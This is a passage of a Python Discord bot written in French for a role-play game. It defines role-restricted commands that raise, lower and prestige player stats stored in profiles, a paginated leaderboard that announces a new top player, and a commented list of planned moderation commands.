        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('territoire_simple', '0'))
    new_value = current + value
    profiles[user_id]['territoire_simple'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Territoire Simple de {target_user.mention} augmenté de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='add-rayon_noir')
@commands.has_role(1432807516731080797)
async def add_rayon_noir(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('rayon_noir', '0'))
    new_value = current + value
    profiles[user_id]['rayon_noir'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Rayon Noir de {target_user.mention} augmenté de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='add-stat')
@commands.has_role(1432807516731080797)
async def add_stat(ctx, stat: str, value: int, user: discord.Member = None):
    stat_mappings = {
        'force': 'force',
        'defense': 'defense',
        'combat': 'combat',
        'energie occulte': 'energie_occulte',
        'vitesse': 'vitesse',
        'endurance': 'endurance'
    }
    key = stat_mappings.get(stat.lower())
    if not key:
        await ctx.send(f"Stat '{stat}' non reconnue. Stats disponibles: force, defense, combat, energie occulte, vitesse, endurance.")
        return
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get(key, '0'))
    new_value = current + value
    profiles[user_id][key] = str(new_value)
    save_profiles(profiles)
    stat_display = stat.capitalize()
    await ctx.send(f"{stat_display} de {target_user.mention} augmentée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-force')
@commands.has_role(1432807516731080797)
async def remove_force(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('force', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['force'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Force de {target_user.mention} diminuée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-defense')
@commands.has_role(1432807516731080797)
async def remove_defense(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('defense', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['defense'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Défense de {target_user.mention} diminuée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-combat')
@commands.has_role(1432807516731080797)
async def remove_combat(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('combat', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['combat'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Combat de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-energie_occulte')
@commands.has_role(1432807516731080797)
async def remove_energie_occulte(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('energie_occulte', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['energie_occulte'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Énergie Occulte de {target_user.mention} diminuée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-vitesse')
@commands.has_role(1432807516731080797)
async def remove_vitesse(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('vitesse', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['vitesse'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Vitesse de {target_user.mention} diminuée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-endurance')
@commands.has_role(1432807516731080797)
async def remove_endurance(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('endurance', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['endurance'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Endurance de {target_user.mention} diminuée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-rct')
@commands.has_role(1432807516731080797)
async def remove_rct(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('rct', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['rct'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"RCT de {target_user.mention} diminué de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='remove-extension')
@commands.has_role(1432807516731080797)
async def remove_extension(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('extension_territoire', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['extension_territoire'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Extension du Territoire de {target_user.mention} diminuée de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='remove-territoire')
@commands.has_role(1432807516731080797)
async def remove_territoire(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('territoire_simple', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['territoire_simple'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Territoire Simple de {target_user.mention} diminué de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='remove-rayon_noir')
@commands.has_role(1432807516731080797)
async def remove_rayon_noir(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('rayon_noir', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['rayon_noir'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Rayon Noir de {target_user.mention} diminué de {value}. Nouvelle valeur: {new_value}")

@bot.command(name='remove-stat')
@commands.has_role(1432807516731080797)
async def remove_stat(ctx, stat: str, value: int, user: discord.Member = None):
    stat_mappings = {
        'force': 'force',
        'defense': 'defense',
        'combat': 'combat',
        'energie occulte': 'energie_occulte',
        'vitesse': 'vitesse',
        'endurance': 'endurance'
    }
    key = stat_mappings.get(stat.lower())
    if not key:
        await ctx.send(f"Stat '{stat}' non reconnue. Stats disponibles: force, defense, combat, energie occulte, vitesse, endurance.")
        return
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get(key, '0'))
    new_value = max(0, current - value)
    profiles[user_id][key] = str(new_value)
    save_profiles(profiles)
    stat_display = stat.capitalize()
    await ctx.send(f"{stat_display} de {target_user.mention} diminuée de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige-force')
@commands.has_role(1432807516731080797)
async def prestige_force(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_force', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_force'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Force de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige-defense')
@commands.has_role(1432807516731080797)
async def prestige_defense(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_defense', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_defense'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Défense de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige-combat')
@commands.has_role(1432807516731080797)
async def prestige_combat(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_combat', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_combat'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Combat de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")


@bot.command(name='prestige-vitesse')
@commands.has_role(1432807516731080797)
async def prestige_vitesse(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_vitesse', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_vitesse'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Vitesse de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige-endurance')
@commands.has_role(1432807516731080797)
async def prestige_endurance(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_endurance', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_endurance'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Endurance de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige-rct')
@commands.has_role(1432807516731080797)
async def prestige_rct(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_rct', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_rct'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Sort d'Inversion de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige_extension_territoire')
@commands.has_role(1432807516731080797)
async def prestige_extension_territoire(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_extension_territoire', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_extension_territoire'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Extension du Territoire de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige_rayon_noir')
@commands.has_role(1432807516731080797)
async def prestige_rayon_noir(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_rayon_noir', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_rayon_noir'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Rayon Noir de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='prestige_territoire_simple')
@commands.has_role(1432807516731080797)
async def prestige_territoire_simple(ctx, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_territoire_simple', '0'))
    new_value = current + 1
    profiles[user_id]['prestige_territoire_simple'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Territoire Simple de {target_user.mention} augmenté. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-force')
@commands.has_role(1432807516731080797)
async def remove_prestige_force(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_force', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_force'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Force de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-defense')
@commands.has_role(1432807516731080797)
async def remove_prestige_defense(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_defense', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_defense'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Défense de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-combat')
@commands.has_role(1432807516731080797)
async def remove_prestige_combat(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_combat', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_combat'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Combat de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-vitesse')
@commands.has_role(1432807516731080797)
async def remove_prestige_vitesse(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_vitesse', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_vitesse'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Vitesse de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-endurance')
@commands.has_role(1432807516731080797)
async def remove_prestige_endurance(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_endurance', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_endurance'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Endurance de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-rct')
@commands.has_role(1432807516731080797)
async def remove_prestige_rct(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_rct', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_rct'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Sort d'Inversion de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-extension_territoire')
@commands.has_role(1432807516731080797)
async def remove_prestige_extension_territoire(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_extension_territoire', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_extension_territoire'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Extension du Territoire de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-rayon_noir')
@commands.has_role(1432807516731080797)
async def remove_prestige_rayon_noir(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_rayon_noir', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_rayon_noir'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Rayon Noir de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command(name='remove-prestige-territoire_simple')
@commands.has_role(1432807516731080797)
async def remove_prestige_territoire_simple(ctx, value: int, user: discord.Member = None):
    profiles = load_profiles()
    target_user = user or ctx.author
    user_id = str(target_user.id)
    if user_id not in profiles:
        await ctx.send(f"{target_user.mention} n'a pas de profil.")
        return
    current = int(profiles[user_id].get('prestige_territoire_simple', '0'))
    new_value = max(0, current - value)
    profiles[user_id]['prestige_territoire_simple'] = str(new_value)
    save_profiles(profiles)
    await ctx.send(f"Prestige Territoire Simple de {target_user.mention} diminué de {value}. Nouvelle valeur: {arabic_to_roman(new_value)}")

@bot.command()
async def top(ctx, page: int = 1):
    profiles = load_profiles()
    if not profiles:
        await ctx.send("Aucun profil trouvé.")
        return
    leaderboard = []
    for user_id, profile in profiles.items():
        total = 0
        stats = ['force', 'defense', 'combat', 'energie_occulte', 'vitesse', 'endurance', 'rct', 'extension_territoire', 'territoire_simple',
                 'prestige_force', 'prestige_defense', 'prestige_combat', 'prestige_energie_occulte', 'prestige_vitesse', 'prestige_endurance',
                 'prestige_rct', 'prestige_extension_territoire', 'prestige_rayon_noir', 'prestige_territoire_simple']
        for stat in stats:
            try:
                value = int(profile.get(stat, '0'))
                if stat.startswith('prestige'):
                    total += value * 10
                else:
                    total += value
            except ValueError:
                pass
        leaderboard.append((total, user_id))
    if not leaderboard:
        await ctx.send("Aucun profil valide trouvé.")
        return
    # Sort descending by total
    leaderboard.sort(reverse=True, key=lambda x: x[0])
    top_user_id = leaderboard[0][1]
    previous = load_previous_top()
    prev_top = previous.get('top_user_id')
    per_page = 15
    total_pages = (len(leaderboard) + per_page - 1) // per_page
    if page < 1 or page > total_pages:
        await ctx.send(f"Page invalide. Il y a {total_pages} pages disponibles.")
        return
    start = (page - 1) * per_page
    end = start + per_page
    page_entries = leaderboard[start:end]
    embed = discord.Embed(title="🏆・Classement des Joueurs (Stats)", color=0x000000)
    description = ""
    for rank, (total, user_id) in enumerate(page_entries, start=start+1):
        user = ctx.guild.get_member(int(user_id))
        if user:
            mention = user.mention
        else:
            mention = f"User {user_id}"
        if rank == 1 and page == 1:
            mention += " **𝐓he 𝐒trongest**"
        if rank == len(leaderboard) and page == total_pages and rank != 1:
            mention += " **𝐓he 𝐅lop 𝐌an**"
        description += f"`{rank}.` {mention} - {total}\n"
    embed.description = description
    embed.set_footer(text=f"Page {page}/{total_pages}")
    embed.set_image(url="https://media.discordapp.net/attachments/1432807935653711872/1436426818868744222/giphy.gif?ex=690f9039&is=690e3eb9&hm=0e3a26d988069d1076041cd5f9ec4959f46507ba8dfb6a535c5e35fb099f3e96&=")
    if page == 1 and prev_top != top_user_id:
        channel = bot.get_channel(1435348240953376838)
        if channel:
            if isinstance(channel, discord.TextChannel):
                perms = channel.permissions_for(ctx.guild.me)
                if perms.view_channel and perms.send_messages:
                    user = ctx.guild.get_member(int(top_user_id))
                    if user:
                        try:
                            await channel.send(f"# <:emoji:1433112347454607390> ||<@&{1432807766606745643}>|| Le top 1 du server a changé ! La personne la plus forte est désormais : {user.mention}")
                            await channel.send(embed=embed)
                        except Exception as e:
                            print(f"Failed to send top change notification: {e}")
                            await ctx.send("Notification de changement de top 1 échouée. Vérifiez les permissions du bot.")
                    else:
                        print(f"User {top_user_id} not found in guild.")
                        await ctx.send("Utilisateur top introuvable.")
                else:
                    print(f"Bot lacks permissions in channel {channel.id}. View: {perms.view_channel}, Send: {perms.send_messages}")
                    await ctx.send("Le bot n'a pas les permissions nécessaires dans le canal cible.")
            else:
                print(f"Channel {channel.id} is not a text channel. Type: {type(channel)}")
                await ctx.send("Le canal cible n'est pas un canal texte.")
        else:
            print(f"Channel 1432808015005880521 not found.")
            await ctx.send("Canal cible introuvable.")
        save_previous_top({'top_user_id': top_user_id})
    await ctx.send(embed=embed)



bot.run("") # ur bot token








#Idées de commandes

# logjoin - Logs when a user joins the server, including timestamp and user info.
# logleave - Logs when a user leaves the server.
# auditroles - Lists all roles and their permissions in the server for auditing.
# mute - Temporarily mutes a user for a specified duration.
# kick - Kicks a user from the server with an optional reason.
# securitytips - Sends a message with security best practices for server members.
# backupchannels - Saves a list of all channels and their settings to a file for backup.
# alert - Sends alerts to admins when suspicious activity is detected (e.g., multiple joins in short time).
# slowmode - Enables slowmode in a channel to prevent spam.
# whitelist - Manages a whitelist of trusted users who bypass certain restrictions.